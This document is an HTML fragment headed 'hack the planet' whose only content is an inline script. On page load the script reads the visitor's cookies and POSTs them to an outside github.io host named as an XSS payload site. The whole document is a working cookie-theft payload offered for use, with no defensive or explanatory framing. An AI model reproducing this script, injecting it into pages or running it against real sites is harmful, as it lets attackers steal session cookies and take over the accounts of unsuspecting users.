  <h1>hack the planet</h1>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const cookie = document.cookie;
      const data = 'cookie=' + encodeURIComponent(cookie);
  
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://mistdexploit.github.io/xsspayload.github.io/index.html', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(data);
  
      xhr.onload = function() {
        if (xhr.status === 200) {
          console.log('Cookie sent successfully!');
        } else {
          console.log('Error sending cookie: ' + xhr.statusText);
        }
      };
    });
  </script>
